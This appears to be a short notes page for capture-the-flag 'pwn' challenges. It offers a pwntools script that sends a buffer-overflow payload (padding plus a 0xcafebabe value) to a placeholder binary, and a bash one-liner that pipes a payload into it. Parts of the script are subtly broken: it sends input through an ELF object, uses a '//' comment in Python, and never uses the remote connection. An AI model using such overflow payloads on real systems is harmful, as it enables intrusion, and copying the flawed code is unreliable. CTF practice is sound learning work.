---
description: just a simple script made in python for pwn challenges
---

# Simple Script

{% code title="Script" %}
```python
from pwn import *

context.bits=64
local = ELF('./filename')
rem = remote('ip', port)
payload = 'A' * 52 + '\xbe\xba\xfe\xca' //offset

local.sendline(payload)
local.interactive()
```
{% endcode %}

{% code title="One-line" %}
```bash
(python3 -c 'import sys; sys.stdout.write("payload")'; echo -e 'offset') | ./filename
```
{% endcode %}
